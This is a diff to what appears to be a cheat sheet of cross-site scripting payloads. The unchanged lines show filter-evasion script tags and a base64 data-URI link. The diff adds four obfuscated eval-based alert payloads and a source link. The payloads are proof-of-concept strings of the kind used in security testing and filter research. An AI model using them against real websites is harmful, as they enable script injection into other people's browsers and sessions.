@@ -134,7 +134,13 @@ alert;pg("XSS")
 <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
 <sCR<script>iPt>alert(1)</SCr</script>IPt>
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+
+<script>eval('al'+'ert(1)');</script>  
+<script>'alert(1)'.replace(/.+/,eval)</script>  
+<img onerror=eval('al\u0065rt(1)') src=a>  
+<script>function::['alert'](1)</script>
   
 ## Source::  
 [https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/](https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/)  
 [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)  
+[https://twitter.com/h1_yusuf/status/1103712960529215488](https://twitter.com/h1_yusuf/status/1103712960529215488)  
